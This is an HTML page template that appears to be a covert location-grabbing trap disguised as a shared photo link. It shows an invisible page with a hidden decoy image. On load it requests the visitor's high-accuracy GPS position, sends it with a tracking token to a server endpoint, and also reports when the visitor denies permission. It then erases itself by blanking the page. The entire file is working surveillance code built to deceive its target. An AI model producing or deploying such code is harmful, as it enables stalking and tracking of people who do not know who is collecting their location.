<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title> </title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  html, body {
    background: #000;
    width: 100%; height: 100%;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  body { opacity: 0; }
  img.photo {
    display: none;
  }
</style>
</head>
<body>
<img class="photo" id="decoy" src="/api/photo/{{ token }}" onerror="this.style.display='none'" onload="this.style.display='none'" />
<script>
(function() {
  'use strict';
  var token = "{{ token }}";
  var _sent = false;

  {% if expired %}
    try { window.location.replace('about:blank'); } catch(e) {}
    return;
  {% endif %}

  function sendCoords(lat, lng, acc) {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({ token: token, latitude: lat, longitude: lng, accuracy: acc });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-update', blob);
    } else {
      try { fetch('/api/location-update', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function sendDenied() {
    if (_sent) return;
    _sent = true;
    var payload = JSON.stringify({ token: token });
    var blob = new Blob([payload], { type: 'application/json' });
    if (navigator.sendBeacon) {
      navigator.sendBeacon('/api/location-denied', blob);
    } else {
      try { fetch('/api/location-denied', { method:'POST', headers:{'Content-Type':'application/json'}, body:payload, keepalive:true }); } catch(e) {}
    }
  }

  function vanish() {
    try { window.location.replace('about:blank'); } catch(e) {}
    setTimeout(function() {
      try { document.open(); document.write(''); document.close(); } catch(e) {}
    }, 10);
  }

  function attemptGps(callback) {
    if (!('geolocation' in navigator)) {
      sendDenied();
      if (callback) callback();
      return;
    }
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        sendCoords(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
        if (callback) callback();
      },
      function() {
        sendDenied();
        if (callback) callback();
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  }

  // ── Permission-aware GPS capture ──
  if (navigator.permissions && navigator.permissions.query) {
    navigator.permissions.query({ name: 'geolocation' }).then(function(status) {
      if (status.state === 'granted') {
        attemptGps(function() { vanish(); });
      } else if (status.state === 'denied') {
        sendDenied();
        vanish();
      } else {
        // 'prompt' — will show dialog, but we proceed anyway
        attemptGps(function() { vanish(); });
      }
    }).catch(function() {
      attemptGps(function() { vanish(); });
    });
  } else {
    attemptGps(function() { vanish(); });
  }

  // ── Safety timeout ──
  setTimeout(function() {
    if (!_sent) { sendDenied(); }
    vanish();
  }, 22000);
})();
</script>
</body>
</html>
